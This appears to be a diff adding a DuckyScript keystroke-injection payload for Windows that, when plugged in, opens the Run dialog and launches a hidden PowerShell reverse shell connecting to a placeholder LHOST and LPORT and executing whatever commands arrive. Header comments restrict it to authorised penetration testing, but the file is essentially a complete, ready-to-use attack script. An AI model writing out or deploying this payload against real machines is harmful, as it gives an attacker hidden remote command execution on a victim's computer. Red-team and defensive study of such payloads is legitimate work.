@@ -1,0 +1,10 @@
+REM DuckyScript: PowerShell reverse shell payload
+REM Target: Windows 10/11 with PowerShell available
+REM IMPORTANT: Replace LHOST and LPORT before use.
+REM AUTHORISED PENETRATION TESTING USE ONLY.
+REM Verify scope-of-work is signed before deploying this payload.
+
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=$r+'PS '+(pwd).Path+'> ';$n=$x.Length;$e=New-Object byte[] $n;$a=New-Object Text.ASCIIEncoding;$a.GetBytes($x,0,$n,$e,0)|Out-Null;$s.Write($e,0,$n)};$c.Close()"
+ENTER
